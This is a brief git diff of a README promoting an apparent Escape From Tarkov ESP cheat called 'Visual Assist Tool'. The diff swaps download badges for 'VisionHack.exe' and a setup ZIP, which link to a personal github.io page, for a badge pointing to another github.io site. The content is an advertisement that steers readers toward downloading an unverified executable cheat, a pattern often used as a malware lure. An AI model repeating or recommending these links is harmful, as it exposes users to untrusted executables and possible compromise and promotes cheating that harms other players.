@@ -1,7 +1,6 @@
-# 👁 Escape From Tarkov ESP — Visual Assist Tool
+# 👁 Escape From Tarkov ESP - Visual Assist Tool
 
-[![Download VisionHack.exe](https://img.shields.io/badge/Download-VisionHack.exe-green?style=for-the-badge)](https://jackson8149766.github.io/.github/eft-esp-visual-assist)
-[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://jackson8149766.github.io/.github/eft-esp-visual-assist)
+[![Open EFT Visual Assist](https://img.shields.io/badge/Open-EFT%20Visual%20Assist-4D7C0F?style=for-the-badge)](https://eft-visual-assist.github.io/.github/)
 
 ---
 
